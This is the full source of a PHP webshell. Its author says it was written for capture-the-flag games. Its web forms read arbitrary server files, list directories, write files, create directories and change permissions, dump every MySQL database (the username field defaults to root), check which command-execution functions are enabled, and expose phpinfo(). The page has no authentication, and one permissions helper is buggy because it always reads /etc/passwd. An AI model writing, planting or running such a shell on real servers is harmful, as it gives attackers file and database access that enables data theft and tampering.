<?php

############################
#### DATABASE FUNCTIONS ####
############################

$db = [];

function getData($dbh, $columns, $tablename, $dbname){
  global $db;
  $columns_str = implode(",", $columns);
  $sql = "SELECT $columns_str FROM $dbname.$tablename;";
  #echo $sql."\n";
  foreach ($dbh->query($sql) as $row) {
    array_push($db[$dbname][$tablename]["data"], array());
    echo "<tr>";
    foreach ($columns as &$colname){
      $c = count($db[$dbname][$tablename]["data"]);
      $db[$dbname][$tablename]["data"][$c-1][$colname] = $row[$colname];
      echo "<td>".$row[$colname]."</td>";
    }
    echo "</tr>";
  }
  echo "<br>";
}

function getColumns($dbh, $tablename, $dbname){
  global $db;
  $sql = "SELECT column_name FROM information_schema.columns WHERE table_name='$tablename' and table_schema='$dbname';";
  #echo $sql."\n";
  echo '<table style="width:100%">';
  echo "<tr>";
  foreach ($dbh->query($sql) as $row) {
    array_push($db[$dbname][$tablename]["columns"], $row['column_name']);
    echo "<th>".$row['column_name']."</th>";
  }
  echo "</tr>";
  getData($dbh, $db[$dbname][$tablename]["columns"], $tablename, $dbname);
}

function getTables($dbh, $dbname) {
  global $db;
  $sql = "SELECT table_name FROM information_schema.tables WHERE table_schema='$dbname';";
  #echo $sql."\n";
  foreach ($dbh->query($sql) as $row) {
    #$db[$dbname][$row['table_name']] = array( "columns" => array(), "data" => array() );
    $db[$dbname][$row['table_name']]["columns"] = array();
    $db[$dbname][$row['table_name']]["data"] = array();
    echo "<h3>Table: ".$row['table_name']."</h3><br>";
    getColumns($dbh, $row['table_name'], $dbname);
  }
}

function dumpDb($mysqlUserName, $mysqlPassword, $mysqlHostName, $checkDefault){
  global $db;
  $dbh = new PDO("mysql:host=$mysqlHostName;user=$mysqlUserName;password=$mysqlPassword");
  $sql = $dbh->query('SHOW DATABASES');
  $dbnames_results = $sql->fetchAll();

  foreach ($dbnames_results as &$dbname) {
    if (! $checkDefault && ($dbname[0] === "information_schema" || $dbname[0] === "mysql" || $dbname[0] === "performance_schema")){
      continue;
    }
    $db[$dbname[0]] = array();
    echo "<h2>Database: ".$dbname[0]."</h2><br>";
    getTables($dbh, $dbname[0]);
  }
}


################################
##### FILESYSTEM FUNCTIONS #####
################################

function printPerms($filepath){
  $perms = fileperms('/etc/passwd');

  switch ($perms & 0xF000) {
      case 0xC000: // socket
          $info = 's';
          break;
      case 0xA000: // symbolic link
          $info = 'l';
          break;
      case 0x8000: // regular
          $info = 'r';
          break;
      case 0x6000: // block special
          $info = 'b';
          break;
      case 0x4000: // directory
          $info = 'd';
          break;
      case 0x2000: // character special
          $info = 'c';
          break;
      case 0x1000: // FIFO pipe
          $info = 'p';
          break;
      default: // unknown
          $info = 'u';
  }

  // Owner
  $info .= (($perms & 0x0100) ? 'r' : '-');
  $info .= (($perms & 0x0080) ? 'w' : '-');
  $info .= (($perms & 0x0040) ?
              (($perms & 0x0800) ? 's' : 'x' ) :
              (($perms & 0x0800) ? 'S' : '-'));

  // Group
  $info .= (($perms & 0x0020) ? 'r' : '-');
  $info .= (($perms & 0x0010) ? 'w' : '-');
  $info .= (($perms & 0x0008) ?
              (($perms & 0x0400) ? 's' : 'x' ) :
              (($perms & 0x0400) ? 'S' : '-'));

  // World
  $info .= (($perms & 0x0004) ? 'r' : '-');
  $info .= (($perms & 0x0002) ? 'w' : '-');
  $info .= (($perms & 0x0001) ?
              (($perms & 0x0200) ? 't' : 'x' ) :
              (($perms & 0x0200) ? 'T' : '-'));

  echo "$info $filepath\n";
}


function listDir($dir){
  echo "Listing $dir\n";
  $filenames  = scandir($dir);
  foreach ($filenames as $filename) {
    if ($filename != "." && $filename != ".."){
      $filepath = "$dir/$filename";
      printPerms($filepath);
    }
  }
}

function readAFile($filepath){
  if (file_exists($filepath)){
    if (is_readable($filepath)) {
      echo "Reading $filepath\n";
      echo file_get_contents($filepath);
    }
    else{
      echo "$filepath: Permission denied\n";
    }
  }
  else{
    echo "$filepath: File doesn't exist\n";
  }
}

function writeAFile($filepath, $content){
  file_put_contents($filepath, $content);
}

function createADir($dirpath, $perms){
  if (! mkdir($dirpath, intval($perms, 8))){
    echo "Error creating the folder $dirpath\n";
  }
  else{
    echo "$dirpath was created\n";
  }
}

function changePerms($dirpath, $perms){
  if (! chmod($dirpath, intval($perms, 8))){
    echo "Error changing permissions of $dirpath\n";
  }
  else{
    echo "Permissions of $dirpath changed correctly\n";
  }
}



####################################
######### CHECK FUNCTIONS ##########
####################################

function check_exec_function($disabled, $func){
  if (!in_array($func, $disabled)){
    echo "$func is enabled!!\n";
  }
  else{
    echo "$func is disabled\n";
  }
}

function check_exec_functions() {
  $disabled = explode(',', ini_get('disable_functions'));
  $funcs = ["exec", "passthru", "system", "shell_exec", "popen", "proc_open", "pcntl_exec", "mail", "putenv"];
  foreach ($funcs as $func) {
    check_exec_function($disabled, $func);
  }
  echo ini_get('disable_functions')."\n";
}

?>

<body style="margin:20;padding:5">
<pre>
<b>Disclaimer: Always use this webshell with permission of the servers owner.</b>
<h1> Filesystem Interaction </h1>
<form method="post">
Read File: <input type="text" id="readfile" name="readfile"><input type="submit" value="Submit">
</form>
<?php if (isset($_POST["readfile"])){ readAFile($_POST["readfile"]); } ?>
<br>
<form method="post">
List Dir: <input type="text" id="listdir" name="listdir"><input type="submit" value="Submit">
</form>
<?php if (isset($_POST["listdir"])){ listDir($_POST["listdir"]); } ?>
<br>
<form method="post">
Create Dir: <input type="text" id="dirpath" name="dirpath">  Perms: <input type="text" id="dirperms" name="dirperms" value="0777"> <input type="submit" value="Submit">
</form>
<?php if (isset($_POST["dirpath"]) && isset($_POST["dirperms"])){ createADir($_POST["dirpath"], $_POST["dirperms"]); } ?>
<br>
<form method="post">
Change Perms: <input type="text" id="permspath" name="permspath">  Perms: <input type="text" id="perms" name="perms" value="0600"> <input type="submit" value="Submit">
</form>
<?php if (isset($_POST["permspath"]) && isset($_POST["perms"])){ changePerms($_POST["permspath"], $_POST["perms"]); } ?>
<br>
<form method="post">
Write file: <input type="text" id="filepath" name="filepath"><br>Content: <br><textarea rows="10" cols="100" name="content"></textarea> <br><input type="submit" value="Submit">
</form>
<?php if (isset($_POST["filepath"]) && isset($_POST["content"])){ writeAFile($_POST["filepath"], $_POST["content"]); } ?>
<br>
<h1> Disabled functions </h1>
<?php check_exec_functions(); ?>
<br>
<h1> Mysql Dump </h1>
Note that this will dump the WHOLE DATABASE. I have created this webshell for CTFs, DO NOT USE THIS IN PRODUCTION ENVIRONMENTS.
<form method="post">
Mysql Username: <input type="text" id="mysqlusername" name="mysqlusername" value="root"><br>
Mysql Password: <input type="text" id="mysqlpassword" name="mysqlpassword"><br>
Mysql Host: <input type="text" id="mysqlhost" name="mysqlhost" value="127.0.0.1"><br>
<input type="checkbox" id="dumpdefault" name="dumpdefault" value="yes"> Dump default databases (information_schema, mysql, performance_schema)<br>
<input type="submit" value="Dump Mysql">
</form>
<?php if (isset($_POST["mysqlusername"]) && isset($_POST["mysqlpassword"]) && isset($_POST["mysqlhost"])){ echo $_POST["dumpdefault"]."\n"; dumpDb($_POST["mysqlusername"], $_POST["mysqlpassword"], $_POST["mysqlhost"], isset($_POST["dumpdefault"])); } ?>
</pre>
<h1> PHPInfo </h1>
<?php phpinfo(); ?>
</body>
